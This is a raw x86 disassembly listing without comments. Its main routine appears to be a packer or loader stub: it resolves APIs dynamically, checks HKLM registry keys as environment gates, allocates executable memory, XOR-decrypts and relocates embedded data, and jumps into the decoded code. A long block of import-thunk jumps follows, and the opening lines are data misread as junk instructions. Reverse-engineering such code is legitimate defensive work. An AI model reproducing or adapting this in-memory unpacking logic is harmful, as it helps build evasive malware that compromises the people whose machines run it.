  41b957:	add    BYTE PTR [esp+esi*8],ah
  41b95a:	inc    ecx
  41b95b:	add    BYTE PTR [eax],ch
  41b95d:	hlt    
  41b95e:	inc    ecx
  41b95f:	add    BYTE PTR [esp+esi*8],ch
  41b962:	inc    ecx
  41b963:	add    BYTE PTR [eax],al
  41b965:	icebp  
  41b966:	inc    ecx
  41b967:	add    BYTE PTR [eax],dh
  41b969:	hlt    
  41b96a:	inc    ecx
  41b96b:	add    BYTE PTR [ebx+esi*8],ch
  41b96e:	inc    ecx
  41b96f:	add    BYTE PTR [esp+esi*8],dh
  41b972:	inc    ecx
  41b973:	add    BYTE PTR [eax],bh
  41b975:	hlt    
  41b976:	inc    ecx
  41b977:	add    BYTE PTR [eax+0x3c0041f0],al
  41b97d:	hlt    
  41b97e:	inc    ecx
  41b97f:	add    BYTE PTR [edx+esi*8-0xbbfffbf],ch
  41b986:	inc    ecx
  41b987:	add    BYTE PTR [esp+esi*8+0x41],al
  41b98b:	add    ah,ah
  41b98d:	icebp  
  41b98e:	inc    ecx
  41b98f:	add    BYTE PTR [eax],bl
  41b991:	hlt    
  41b992:	inc    ecx
  41b993:	add    BYTE PTR [eax-0xc],cl
  41b996:	inc    ecx
  41b997:	add    BYTE PTR [esp+esi*8+0x41],cl
  41b99b:	add    ah,cl
  41b99d:	int3   
  41b99e:	int3   
  41b99f:	int3   
  41b9a0:	push   ebp
  41b9a1:	mov    ebp,esp
  41b9a3:	push   ecx
  41b9a4:	mov    DWORD PTR [ebp-0x4],0x1e4dc
  41b9ab:	push   0x40
  41b9ad:	push   0x3000
  41b9b2:	mov    eax,DWORD PTR [ebp+0x8]
  41b9b5:	push   eax
  41b9b6:	push   0x0
  41b9b8:	call   DWORD PTR ds:0x41ed3c
  41b9be:	mov    esp,ebp
  41b9c0:	pop    ebp
  41b9c1:	ret    
  41b9c2:	int3   
  41b9c3:	int3   
  41b9c4:	int3   
  41b9c5:	int3   
  41b9c6:	int3   
  41b9c7:	int3   
  41b9c8:	int3   
  41b9c9:	int3   
  41b9ca:	int3   
  41b9cb:	int3   
  41b9cc:	int3   
  41b9cd:	int3   
  41b9ce:	int3   
  41b9cf:	int3   
  41b9d0:	push   ebp
  41b9d1:	mov    ebp,esp
  41b9d3:	pop    ebp
  41b9d4:	ret    
  41b9d5:	int3   
  41b9d6:	int3   
  41b9d7:	int3   
  41b9d8:	int3   
  41b9d9:	int3   
  41b9da:	int3   
  41b9db:	int3   
  41b9dc:	int3   
  41b9dd:	int3   
  41b9de:	int3   
  41b9df:	int3   
  41b9e0:	push   ebp
  41b9e1:	mov    ebp,esp
  41b9e3:	sub    esp,0x8
  41b9e6:	mov    eax,DWORD PTR [ebp+0x8]
  41b9e9:	mov    DWORD PTR [ebp-0x4],eax
  41b9ec:	mov    ecx,DWORD PTR [ebp+0xc]
  41b9ef:	mov    DWORD PTR [ebp-0x8],ecx
  41b9f2:	mov    edx,DWORD PTR [ebp-0x4]
  41b9f5:	cmp    edx,DWORD PTR [ebp-0x8]
  41b9f8:	jae    0x41ba01
  41b9fa:	mov    eax,DWORD PTR [ebp-0x4]
  41b9fd:	jmp    0x41ba04
  41b9ff:	jmp    0x41ba04
  41ba01:	mov    eax,DWORD PTR [ebp-0x8]
  41ba04:	mov    esp,ebp
  41ba06:	pop    ebp
  41ba07:	ret    
  41ba08:	int3   
  41ba09:	int3   
  41ba0a:	int3   
  41ba0b:	int3   
  41ba0c:	int3   
  41ba0d:	int3   
  41ba0e:	int3   
  41ba0f:	int3   
  41ba10:	push   ebp
  41ba11:	mov    ebp,esp
  41ba13:	push   ecx
  41ba14:	push   0x41e000
  41ba19:	push   0x41e018
  41ba1e:	call   DWORD PTR ds:0x41f068
  41ba24:	push   eax
  41ba25:	call   DWORD PTR ds:0x41ef08
  41ba2b:	mov    DWORD PTR [ebp-0x4],eax
  41ba2e:	push   0x104
  41ba33:	push   0x422aa4
  41ba38:	call   DWORD PTR [ebp-0x4]
  41ba3b:	push   0x41e024
  41ba40:	push   0x422aa4
  41ba45:	call   DWORD PTR ds:0x41f06c
  41ba4b:	mov    DWORD PTR ds:0x422ba8,0x401004
  41ba55:	mov    esp,ebp
  41ba57:	pop    ebp
  41ba58:	ret    
  41ba59:	int3   
  41ba5a:	int3   
  41ba5b:	int3   
  41ba5c:	int3   
  41ba5d:	int3   
  41ba5e:	int3   
  41ba5f:	int3   
  41ba60:	push   ebp
  41ba61:	mov    ebp,esp
  41ba63:	mov    DWORD PTR ds:0x422ba8,0x41a928
  41ba6d:	pop    ebp
  41ba6e:	ret    
  41ba6f:	int3   
  41ba70:	push   ebp
  41ba71:	mov    ebp,esp
  41ba73:	mov    eax,DWORD PTR [ebp+0x8]
  41ba76:	mov    eax,DWORD PTR [eax-0x4]
  41ba79:	pop    ebp
  41ba7a:	ret    
  41ba7b:	int3   
  41ba7c:	int3   
  41ba7d:	int3   
  41ba7e:	int3   
  41ba7f:	int3   
  41ba80:	push   ebp
  41ba81:	mov    ebp,esp
  41ba83:	sub    esp,0xc
  41ba86:	mov    DWORD PTR [ebp-0x4],0x0
  41ba8d:	jmp    0x41ba98
  41ba8f:	mov    eax,DWORD PTR [ebp-0x4]
  41ba92:	add    eax,0x1
  41ba95:	mov    DWORD PTR [ebp-0x4],eax
  41ba98:	mov    ecx,DWORD PTR [ebp-0x4]
  41ba9b:	cmp    ecx,DWORD PTR [ebp+0x8]
  41ba9e:	jae    0x41baef
  41baa0:	mov    edx,DWORD PTR [ebp-0x4]
  41baa3:	mov    eax,DWORD PTR [ebp+0xc]
  41baa6:	movzx  ecx,WORD PTR [eax+edx*2]
  41baaa:	sar    ecx,0xc
  41baad:	cmp    ecx,0x3
  41bab0:	jne    0x41baed
  41bab2:	mov    DWORD PTR [ebp-0xc],0xfff
  41bab9:	mov    edx,DWORD PTR [ebp-0x4]
  41babc:	mov    eax,DWORD PTR [ebp+0xc]
  41babf:	movzx  ecx,WORD PTR [eax+edx*2]
  41bac3:	and    ecx,DWORD PTR [ebp-0xc]
  41bac6:	add    ecx,0x43
  41bac9:	mov    DWORD PTR [ebp-0x8],ecx
  41bacc:	mov    edx,DWORD PTR [ebp+0x18]
  41bacf:	mov    eax,DWORD PTR [ebp+0x10]
  41bad2:	add    eax,DWORD PTR [edx]
  41bad4:	mov    ecx,DWORD PTR [ebp-0x8]
  41bad7:	mov    edx,DWORD PTR [eax+ecx*1-0x43]
  41badb:	add    edx,DWORD PTR [ebp+0x14]
  41bade:	mov    eax,DWORD PTR [ebp+0x18]
  41bae1:	mov    ecx,DWORD PTR [ebp+0x10]
  41bae4:	add    ecx,DWORD PTR [eax]
  41bae6:	mov    eax,DWORD PTR [ebp-0x8]
  41bae9:	mov    DWORD PTR [ecx+eax*1-0x43],edx
  41baed:	jmp    0x41ba8f
  41baef:	mov    esp,ebp
  41baf1:	pop    ebp
  41baf2:	ret    
  41baf3:	int3   
  41baf4:	int3   
  41baf5:	int3   
  41baf6:	int3   
  41baf7:	int3   
  41baf8:	int3   
  41baf9:	int3   
  41bafa:	int3   
  41bafb:	int3   
  41bafc:	int3   
  41bafd:	int3   
  41bafe:	int3   
  41baff:	int3   
  41bb00:	push   ebp
  41bb01:	mov    ebp,esp
  41bb03:	sub    esp,0x14
  41bb06:	mov    eax,DWORD PTR [ebp+0x8]
  41bb09:	cmp    DWORD PTR [eax+0x4],0x0
  41bb0d:	je     0x41bb57
  41bb0f:	mov    DWORD PTR [ebp-0x14],0x2a1
  41bb16:	mov    ecx,DWORD PTR [ebp+0x8]
  41bb19:	mov    edx,DWORD PTR [ecx+0x4]
  41bb1c:	sub    edx,0x8
  41bb1f:	shr    edx,1
  41bb21:	mov    DWORD PTR [ebp-0xc],edx
  41bb24:	mov    eax,DWORD PTR [ebp+0x8]
  41bb27:	add    eax,0x8
  41bb2a:	mov    DWORD PTR [ebp-0x10],eax
  41bb2d:	mov    ecx,DWORD PTR [ebp+0x8]
  41bb30:	push   ecx
  41bb31:	mov    edx,DWORD PTR [ebp+0x10]
  41bb34:	push   edx
  41bb35:	mov    eax,DWORD PTR [ebp+0xc]
  41bb38:	push   eax
  41bb39:	mov    ecx,DWORD PTR [ebp-0x10]
  41bb3c:	push   ecx
  41bb3d:	mov    edx,DWORD PTR [ebp-0xc]
  41bb40:	push   edx
  41bb41:	call   0x41ba80
  41bb46:	add    esp,0x14
  41bb49:	mov    eax,DWORD PTR [ebp+0x8]
  41bb4c:	mov    ecx,DWORD PTR [ebp+0x8]
  41bb4f:	add    ecx,DWORD PTR [eax+0x4]
  41bb52:	mov    DWORD PTR [ebp+0x8],ecx
  41bb55:	jmp    0x41bb06
  41bb57:	mov    esp,ebp
  41bb59:	pop    ebp
  41bb5a:	ret    
  41bb5b:	int3   
  41bb5c:	int3   
  41bb5d:	int3   
  41bb5e:	int3   
  41bb5f:	int3   
  41bb60:	push   ebp
  41bb61:	mov    ebp,esp
  41bb63:	sub    esp,0x24
  41bb66:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41bb6d:	mov    DWORD PTR [ebp-0x10],0x0
  41bb74:	jmp    0x41bb7f
  41bb76:	mov    eax,DWORD PTR [ebp-0x10]
  41bb79:	add    eax,0x4
  41bb7c:	mov    DWORD PTR [ebp-0x10],eax
  41bb7f:	mov    ecx,DWORD PTR [ebp-0x10]
  41bb82:	cmp    ecx,DWORD PTR [ebp+0xc]
  41bb85:	jae    0x41bc2e
  41bb8b:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41bb92:	cmp    DWORD PTR [ebp-0x10],0x0
  41bb96:	jne    0x41bbc8
  41bb98:	push   0x0
  41bb9a:	push   0x80
  41bb9f:	push   0x3
  41bba1:	push   0x0
  41bba3:	push   0x3
  41bba5:	push   0x1
  41bba7:	push   0x422aa4
  41bbac:	call   DWORD PTR ds:0x41ec98
  41bbb2:	mov    DWORD PTR [ebp-0x4],eax
  41bbb5:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  41bbb9:	je     0x41bbc1
  41bbbb:	cmp    DWORD PTR [ebp-0x4],0x0
  41bbbf:	jne    0x41bbc8
  41bbc1:	mov    eax,0x42
  41bbc6:	jmp    0x41bc2e
  41bbc8:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41bbcf:	mov    edx,DWORD PTR [ebp-0x10]
  41bbd2:	add    edx,0x39
  41bbd5:	mov    DWORD PTR ds:0x422bac,edx
  41bbdb:	mov    eax,DWORD PTR [ebp+0x8]
  41bbde:	add    eax,DWORD PTR [ebp-0x10]
  41bbe1:	mov    ecx,DWORD PTR [eax]
  41bbe3:	add    ecx,DWORD PTR [ebp-0x10]
  41bbe6:	mov    edx,DWORD PTR [ebp+0x8]
  41bbe9:	add    edx,DWORD PTR [ebp-0x10]
  41bbec:	mov    DWORD PTR [edx],ecx
  41bbee:	mov    eax,DWORD PTR [ebp-0xc]
  41bbf1:	mov    DWORD PTR [ebp-0x14],eax
  41bbf4:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41bbfb:	mov    ecx,DWORD PTR ds:0x422bac
  41bc01:	mov    DWORD PTR [ebp-0x24],ecx
  41bc04:	mov    edx,DWORD PTR [ebp-0x24]
  41bc07:	mov    DWORD PTR [ebp-0x20],edx
  41bc0a:	mov    eax,DWORD PTR [ebp-0x20]
  41bc0d:	mov    DWORD PTR [ebp-0x1c],eax
  41bc10:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bc13:	mov    DWORD PTR [ebp-0x18],ecx
  41bc16:	mov    edx,DWORD PTR [ebp+0x8]
  41bc19:	add    edx,DWORD PTR [ebp-0x10]
  41bc1c:	mov    eax,DWORD PTR [edx]
  41bc1e:	xor    eax,DWORD PTR [ebp-0x18]
  41bc21:	mov    ecx,DWORD PTR [ebp+0x8]
  41bc24:	add    ecx,DWORD PTR [ebp-0x10]
  41bc27:	mov    DWORD PTR [ecx],eax
  41bc29:	jmp    0x41bb76
  41bc2e:	mov    esp,ebp
  41bc30:	pop    ebp
  41bc31:	ret    
  41bc32:	int3   
  41bc33:	int3   
  41bc34:	int3   
  41bc35:	int3   
  41bc36:	int3   
  41bc37:	int3   
  41bc38:	int3   
  41bc39:	int3   
  41bc3a:	int3   
  41bc3b:	int3   
  41bc3c:	int3   
  41bc3d:	int3   
  41bc3e:	int3   
  41bc3f:	int3   
  41bc40:	push   ebp
  41bc41:	mov    ebp,esp
  41bc43:	xor    eax,eax
  41bc45:	pop    ebp
  41bc46:	ret    0x10
  41bc49:	int3   
  41bc4a:	int3   
  41bc4b:	int3   
  41bc4c:	int3   
  41bc4d:	int3   
  41bc4e:	int3   
  41bc4f:	int3   
  41bc50:	push   ebp
  41bc51:	mov    ebp,esp
  41bc53:	sub    esp,0x2cc
  41bc59:	pusha  
  41bc5a:	mov    DWORD PTR ds:0x422bb0,ebp
  41bc60:	mov    DWORD PTR [ebp-0x29c],0x0
  41bc6a:	push   0x41e040
  41bc6f:	push   0x41e050
  41bc74:	call   DWORD PTR ds:0x41f068
  41bc7a:	push   eax
  41bc7b:	call   DWORD PTR ds:0x41ef08
  41bc81:	mov    DWORD PTR [ebp-0x284],eax
  41bc87:	mov    DWORD PTR [ebp-0x8],0xe1d58000
  41bc8e:	mov    DWORD PTR [ebp-0x4],0x1a8e79f
  41bc95:	lea    eax,[ebp-0x2b0]
  41bc9b:	push   eax
  41bc9c:	lea    ecx,[ebp-0x2b4]
  41bca2:	push   ecx
  41bca3:	lea    edx,[ebp-0x8]
  41bca6:	push   edx
  41bca7:	call   DWORD PTR ds:0x41f070
  41bcad:	movzx  eax,WORD PTR [ebp-0x2b4]
  41bcb4:	cmp    eax,0x21
  41bcb7:	je     0x41bcc0
  41bcb9:	xor    eax,eax
  41bcbb:	jmp    0x41c01a
  41bcc0:	lea    ecx,[ebp-0x260]
  41bcc6:	push   ecx
  41bcc7:	push   0x20019
  41bccc:	push   0x0
  41bcce:	push   0x422aa0
  41bcd3:	push   0x80000002
  41bcd8:	call   DWORD PTR [ebp-0x284]
  41bcde:	test   eax,eax
  41bce0:	je     0x41bce9
  41bce2:	xor    eax,eax
  41bce4:	jmp    0x41c01a
  41bce9:	lea    edx,[ebp-0x260]
  41bcef:	push   edx
  41bcf0:	push   0x20019
  41bcf5:	push   0x0
  41bcf7:	push   0x41e060
  41bcfc:	mov    eax,DWORD PTR [ebp-0x260]
  41bd02:	push   eax
  41bd03:	call   DWORD PTR [ebp-0x284]
  41bd09:	test   eax,eax
  41bd0b:	je     0x41bd14
  41bd0d:	xor    eax,eax
  41bd0f:	jmp    0x41c01a
  41bd14:	lea    ecx,[ebp-0x260]
  41bd1a:	push   ecx
  41bd1b:	push   0x20019
  41bd20:	push   0x0
  41bd22:	push   0x41e110
  41bd27:	mov    edx,DWORD PTR [ebp-0x260]
  41bd2d:	push   edx
  41bd2e:	call   DWORD PTR [ebp-0x284]
  41bd34:	test   eax,eax
  41bd36:	jne    0x41bd3f
  41bd38:	xor    eax,eax
  41bd3a:	jmp    0x41c01a
  41bd3f:	mov    DWORD PTR [ebp-0x21c],0x0
  41bd49:	mov    DWORD PTR [ebp-0x290],0x64
  41bd53:	mov    DWORD PTR [ebp-0x224],0x14
  41bd5d:	mov    DWORD PTR [ebp-0x29c],0x0
  41bd67:	mov    DWORD PTR [ebp-0x25c],0x0
  41bd71:	mov    DWORD PTR [ebp-0x28c],0x1
  41bd7b:	mov    DWORD PTR [ebp-0x220],0x3
  41bd85:	call   0x41ba10
  41bd8a:	mov    eax,ds:0x422ba8
  41bd8f:	push   eax
  41bd90:	call   0x41ba70
  41bd95:	add    esp,0x4
  41bd98:	mov    DWORD PTR [ebp-0x2a0],eax
  41bd9e:	mov    ecx,DWORD PTR [ebp-0x2a0]
  41bda4:	push   ecx
  41bda5:	call   0x41b9a0
  41bdaa:	add    esp,0x4
  41bdad:	mov    DWORD PTR [ebp-0x298],eax
  41bdb3:	mov    edx,DWORD PTR [ebp-0x2a0]
  41bdb9:	push   edx
  41bdba:	push   0x0
  41bdbc:	mov    eax,DWORD PTR [ebp-0x298]
  41bdc2:	push   eax
  41bdc3:	call   0x41b9d0
  41bdc8:	add    esp,0xc
  41bdcb:	mov    ecx,DWORD PTR [ebp-0x2a0]
  41bdd1:	mov    DWORD PTR [ebp-0x2a8],ecx
  41bdd7:	mov    edx,DWORD PTR [ebp-0x29c]
  41bddd:	cmp    edx,DWORD PTR [ebp-0x2a0]
  41bde3:	jae    0x41be6e
  41bde9:	mov    eax,DWORD PTR [ebp-0x2a8]
  41bdef:	push   eax
  41bdf0:	mov    ecx,DWORD PTR [ebp-0x290]
  41bdf6:	push   ecx
  41bdf7:	call   0x41b9e0
  41bdfc:	add    esp,0x8
  41bdff:	mov    DWORD PTR [ebp-0x2ac],eax
  41be05:	mov    edx,DWORD PTR [ebp-0x2ac]
  41be0b:	push   edx
  41be0c:	mov    eax,ds:0x422ba8
  41be11:	add    eax,DWORD PTR [ebp-0x25c]
  41be17:	push   eax
  41be18:	mov    ecx,DWORD PTR [ebp-0x298]
  41be1e:	add    ecx,DWORD PTR [ebp-0x29c]
  41be24:	push   ecx
  41be25:	call   0x41cbfa
  41be2a:	add    esp,0xc
  41be2d:	mov    edx,DWORD PTR [ebp-0x224]
  41be33:	add    edx,DWORD PTR [ebp-0x290]
  41be39:	add    edx,DWORD PTR [ebp-0x25c]
  41be3f:	mov    DWORD PTR [ebp-0x25c],edx
  41be45:	mov    eax,DWORD PTR [ebp-0x29c]
  41be4b:	add    eax,DWORD PTR [ebp-0x290]
  41be51:	mov    DWORD PTR [ebp-0x29c],eax
  41be57:	mov    ecx,DWORD PTR [ebp-0x2a8]
  41be5d:	sub    ecx,DWORD PTR [ebp-0x2ac]
  41be63:	mov    DWORD PTR [ebp-0x2a8],ecx
  41be69:	jmp    0x41bdd7
  41be6e:	mov    edx,DWORD PTR [ebp-0x2a0]
  41be74:	push   edx
  41be75:	mov    eax,DWORD PTR [ebp-0x298]
  41be7b:	push   eax
  41be7c:	call   0x41bb60
  41be81:	add    esp,0x8
  41be84:	mov    DWORD PTR [ebp-0x25c],0x0
  41be8e:	mov    DWORD PTR [ebp-0x2bc],0x0
  41be98:	call   0x41ba60
  41be9d:	mov    ecx,DWORD PTR ds:0x422ba8
  41bea3:	push   ecx
  41bea4:	call   0x41ba70
  41bea9:	add    esp,0x4
  41beac:	mov    DWORD PTR [ebp-0x2c0],eax
  41beb2:	mov    edx,DWORD PTR [ebp-0x2c0]
  41beb8:	push   edx
  41beb9:	call   0x41b9a0
  41bebe:	add    esp,0x4
  41bec1:	mov    DWORD PTR [ebp-0x258],eax
  41bec7:	mov    eax,DWORD PTR [ebp-0x2c0]
  41becd:	push   eax
  41bece:	push   0x0
  41bed0:	mov    ecx,DWORD PTR [ebp-0x258]
  41bed6:	push   ecx
  41bed7:	call   0x41b9d0
  41bedc:	add    esp,0xc
  41bedf:	mov    edx,DWORD PTR [ebp-0x2c0]
  41bee5:	mov    DWORD PTR [ebp-0x2c8],edx
  41beeb:	mov    eax,DWORD PTR [ebp-0x2bc]
  41bef1:	cmp    eax,DWORD PTR [ebp-0x2c0]
  41bef7:	jae    0x41bf83
  41befd:	mov    ecx,DWORD PTR [ebp-0x2c8]
  41bf03:	push   ecx
  41bf04:	mov    edx,DWORD PTR [ebp-0x290]
  41bf0a:	push   edx
  41bf0b:	call   0x41b9e0
  41bf10:	add    esp,0x8
  41bf13:	mov    DWORD PTR [ebp-0x2cc],eax
  41bf19:	mov    eax,DWORD PTR [ebp-0x2cc]
  41bf1f:	push   eax
  41bf20:	mov    ecx,DWORD PTR ds:0x422ba8
  41bf26:	add    ecx,DWORD PTR [ebp-0x25c]
  41bf2c:	push   ecx
  41bf2d:	mov    edx,DWORD PTR [ebp-0x258]
  41bf33:	add    edx,DWORD PTR [ebp-0x2bc]
  41bf39:	push   edx
  41bf3a:	call   0x41cbfa
  41bf3f:	add    esp,0xc
  41bf42:	mov    eax,DWORD PTR [ebp-0x224]
  41bf48:	add    eax,DWORD PTR [ebp-0x290]
  41bf4e:	add    eax,DWORD PTR [ebp-0x25c]
  41bf54:	mov    DWORD PTR [ebp-0x25c],eax
  41bf5a:	mov    ecx,DWORD PTR [ebp-0x2bc]
  41bf60:	add    ecx,DWORD PTR [ebp-0x290]
  41bf66:	mov    DWORD PTR [ebp-0x2bc],ecx
  41bf6c:	mov    edx,DWORD PTR [ebp-0x2c8]
  41bf72:	sub    edx,DWORD PTR [ebp-0x2cc]
  41bf78:	mov    DWORD PTR [ebp-0x2c8],edx
  41bf7e:	jmp    0x41beeb
  41bf83:	mov    eax,DWORD PTR [ebp-0x2c0]
  41bf89:	push   eax
  41bf8a:	mov    ecx,DWORD PTR [ebp-0x258]
  41bf90:	push   ecx
  41bf91:	call   0x41bb60
  41bf96:	add    esp,0x8
  41bf99:	mov    edx,DWORD PTR [ebp-0x298]
  41bf9f:	mov    eax,DWORD PTR [ebp-0x258]
  41bfa5:	mov    DWORD PTR [edx],eax
  41bfa7:	push   0x17000
  41bfac:	call   0x41b9a0
  41bfb1:	add    esp,0x4
  41bfb4:	mov    DWORD PTR [ebp-0xc],eax
  41bfb7:	push   0x15500
  41bfbc:	mov    ecx,DWORD PTR [ebp-0x298]
  41bfc2:	push   ecx
  41bfc3:	mov    edx,DWORD PTR [ebp-0xc]
  41bfc6:	add    edx,0x200
  41bfcc:	push   edx
  41bfcd:	call   0x41cbfa
  41bfd2:	add    esp,0xc
  41bfd5:	mov    eax,DWORD PTR [ebp-0xc]
  41bfd8:	sub    eax,0x400000
  41bfdd:	push   eax
  41bfde:	mov    ecx,DWORD PTR [ebp-0xc]
  41bfe1:	push   ecx
  41bfe2:	mov    edx,DWORD PTR [ebp-0x258]
  41bfe8:	push   edx
  41bfe9:	call   0x41bb00
  41bfee:	add    esp,0xc
  41bff1:	mov    esp,DWORD PTR ds:0x422bb0
  41bff7:	pop    eax
  41bff8:	mov    eax,DWORD PTR [ebp-0xc]
  41bffb:	add    eax,0x15350
  41c000:	call   0x41c005
  41c005:	pop    ecx
  41c006:	call   0x41c00b
  41c00b:	pop    ecx
  41c00c:	call   0x41c011
  41c011:	pop    ecx
  41c012:	call   0x41c017
  41c017:	pop    ecx
  41c018:	jmp    eax
  41c01a:	mov    esp,ebp
  41c01c:	pop    ebp
  41c01d:	ret    
  41c01e:	jmp    DWORD PTR ds:0x41ec64
  41c024:	jmp    DWORD PTR ds:0x41ec68
  41c02a:	jmp    DWORD PTR ds:0x41ec6c
  41c030:	jmp    DWORD PTR ds:0x41ec70
  41c036:	jmp    DWORD PTR ds:0x41ec74
  41c03c:	jmp    DWORD PTR ds:0x41ec78
  41c042:	jmp    DWORD PTR ds:0x41ec7c
  41c048:	jmp    DWORD PTR ds:0x41ec80
  41c04e:	jmp    DWORD PTR ds:0x41ec84
  41c054:	jmp    DWORD PTR ds:0x41ec88
  41c05a:	jmp    DWORD PTR ds:0x41ec8c
  41c060:	jmp    DWORD PTR ds:0x41ec90
  41c066:	jmp    DWORD PTR ds:0x41ec94
  41c06c:	jmp    DWORD PTR ds:0x41ec98
  41c072:	jmp    DWORD PTR ds:0x41ec9c
  41c078:	jmp    DWORD PTR ds:0x41eca0
  41c07e:	jmp    DWORD PTR ds:0x41eca4
  41c084:	jmp    DWORD PTR ds:0x41eca8
  41c08a:	jmp    DWORD PTR ds:0x41ecac
  41c090:	jmp    DWORD PTR ds:0x41ecb0
  41c096:	jmp    DWORD PTR ds:0x41ecb4
  41c09c:	jmp    DWORD PTR ds:0x41ecb8
  41c0a2:	jmp    DWORD PTR ds:0x41ecbc
  41c0a8:	jmp    DWORD PTR ds:0x41ecc0
  41c0ae:	jmp    DWORD PTR ds:0x41ecc4
  41c0b4:	jmp    DWORD PTR ds:0x41ecc8
  41c0ba:	jmp    DWORD PTR ds:0x41eccc
  41c0c0:	jmp    DWORD PTR ds:0x41ecd0
  41c0c6:	jmp    DWORD PTR ds:0x41ecd4
  41c0cc:	jmp    DWORD PTR ds:0x41ecd8
  41c0d2:	jmp    DWORD PTR ds:0x41ecdc
  41c0d8:	jmp    DWORD PTR ds:0x41ece0
  41c0de:	jmp    DWORD PTR ds:0x41ece4
  41c0e4:	jmp    DWORD PTR ds:0x41ece8
  41c0ea:	jmp    DWORD PTR ds:0x41ecec
  41c0f0:	jmp    DWORD PTR ds:0x41ecf0
  41c0f6:	jmp    DWORD PTR ds:0x41ecf4
  41c0fc:	jmp    DWORD PTR ds:0x41ecf8
  41c102:	jmp    DWORD PTR ds:0x41ecfc
  41c108:	jmp    DWORD PTR ds:0x41ed00
  41c10e:	jmp    DWORD PTR ds:0x41ed04
  41c114:	jmp    DWORD PTR ds:0x41ed08
  41c11a:	jmp    DWORD PTR ds:0x41ed0c
  41c120:	jmp    DWORD PTR ds:0x41ed10
  41c126:	jmp    DWORD PTR ds:0x41ed14
  41c12c:	jmp    DWORD PTR ds:0x41ed18
  41c132:	jmp    DWORD PTR ds:0x41ed1c
  41c138:	jmp    DWORD PTR ds:0x41ed20
  41c13e:	jmp    DWORD PTR ds:0x41ed24
  41c144:	jmp    DWORD PTR ds:0x41ed28
  41c14a:	jmp    DWORD PTR ds:0x41ed2c
  41c150:	jmp    DWORD PTR ds:0x41ed30
  41c156:	jmp    DWORD PTR ds:0x41ed34
  41c15c:	jmp    DWORD PTR ds:0x41ed38
  41c162:	jmp    DWORD PTR ds:0x41ed3c
  41c168:	jmp    DWORD PTR ds:0x41ed40
  41c16e:	jmp    DWORD PTR ds:0x41ed44
  41c174:	jmp    DWORD PTR ds:0x41ed48
  41c17a:	jmp    DWORD PTR ds:0x41ed4c
  41c180:	jmp    DWORD PTR ds:0x41ed50
  41c186:	jmp    DWORD PTR ds:0x41ed54
  41c18c:	jmp    DWORD PTR ds:0x41ed58
  41c192:	jmp    DWORD PTR ds:0x41ed5c
  41c198:	jmp    DWORD PTR ds:0x41ed60
  41c19e:	jmp    DWORD PTR ds:0x41ed64
  41c1a4:	jmp    DWORD PTR ds:0x41ed68
  41c1aa:	jmp    DWORD PTR ds:0x41ed6c
  41c1b0:	jmp    DWORD PTR ds:0x41ed70
  41c1b6:	jmp    DWORD PTR ds:0x41ed74
  41c1bc:	jmp    DWORD PTR ds:0x41ed78
  41c1c2:	jmp    DWORD PTR ds:0x41ed7c
  41c1c8:	jmp    DWORD PTR ds:0x41ed80
  41c1ce:	jmp    DWORD PTR ds:0x41ed84
  41c1d4:	jmp    DWORD PTR ds:0x41ed88
  41c1da:	jmp    DWORD PTR ds:0x41ed8c
  41c1e0:	jmp    DWORD PTR ds:0x41ed90
  41c1e6:	jmp    DWORD PTR ds:0x41ed94
  41c1ec:	jmp    DWORD PTR ds:0x41ed98
  41c1f2:	jmp    DWORD PTR ds:0x41ed9c
  41c1f8:	jmp    DWORD PTR ds:0x41eda0
  41c1fe:	jmp    DWORD PTR ds:0x41eda4
  41c204:	jmp    DWORD PTR ds:0x41eda8
  41c20a:	jmp    DWORD PTR ds:0x41edac
  41c210:	jmp    DWORD PTR ds:0x41edb0
  41c216:	jmp    DWORD PTR ds:0x41edb4
  41c21c:	jmp    DWORD PTR ds:0x41edb8
  41c222:	jmp    DWORD PTR ds:0x41edbc
  41c228:	jmp    DWORD PTR ds:0x41edc0
  41c22e:	jmp    DWORD PTR ds:0x41edc4
  41c234:	jmp    DWORD PTR ds:0x41edc8
  41c23a:	jmp    DWORD PTR ds:0x41edcc
  41c240:	jmp    DWORD PTR ds:0x41edd0
  41c246:	jmp    DWORD PTR ds:0x41edd4
  41c24c:	jmp    DWORD PTR ds:0x41edd8
  41c252:	jmp    DWORD PTR ds:0x41eddc
  41c258:	jmp    DWORD PTR ds:0x41ede0
  41c25e:	jmp    DWORD PTR ds:0x41ede4
  41c264:	jmp    DWORD PTR ds:0x41ede8
  41c26a:	jmp    DWORD PTR ds:0x41edec
  41c270:	jmp    DWORD PTR ds:0x41edf0
  41c276:	jmp    DWORD PTR ds:0x41edf4
  41c27c:	jmp    DWORD PTR ds:0x41edf8
  41c282:	jmp    DWORD PTR ds:0x41edfc
  41c288:	jmp    DWORD PTR ds:0x41ee00
  41c28e:	jmp    DWORD PTR ds:0x41ee04
  41c294:	jmp    DWORD PTR ds:0x41ee08
  41c29a:	jmp    DWORD PTR ds:0x41ee0c
  41c2a0:	jmp    DWORD PTR ds:0x41ee10
  41c2a6:	jmp    DWORD PTR ds:0x41ee14
  41c2ac:	jmp    DWORD PTR ds:0x41ee18
  41c2b2:	jmp    DWORD PTR ds:0x41ee1c
  41c2b8:	jmp    DWORD PTR ds:0x41ee20
  41c2be:	jmp    DWORD PTR ds:0x41ee24
  41c2c4:	jmp    DWORD PTR ds:0x41ee28
  41c2ca:	jmp    DWORD PTR ds:0x41ee2c
  41c2d0:	jmp    DWORD PTR ds:0x41ee30
  41c2d6:	jmp    DWORD PTR ds:0x41ee34
  41c2dc:	jmp    DWORD PTR ds:0x41ee38
  41c2e2:	jmp    DWORD PTR ds:0x41ee3c
  41c2e8:	jmp    DWORD PTR ds:0x41ee40
  41c2ee:	jmp    DWORD PTR ds:0x41ee44
  41c2f4:	jmp    DWORD PTR ds:0x41ee48
  41c2fa:	jmp    DWORD PTR ds:0x41ee4c
  41c300:	jmp    DWORD PTR ds:0x41ee50
  41c306:	jmp    DWORD PTR ds:0x41ee54
  41c30c:	jmp    DWORD PTR ds:0x41ee58
  41c312:	jmp    DWORD PTR ds:0x41ee5c
  41c318:	jmp    DWORD PTR ds:0x41ee60
  41c31e:	jmp    DWORD PTR ds:0x41ee64
  41c324:	jmp    DWORD PTR ds:0x41ee68
  41c32a:	jmp    DWORD PTR ds:0x41ee6c
  41c330:	jmp    DWORD PTR ds:0x41ee70
  41c336:	jmp    DWORD PTR ds:0x41ee74
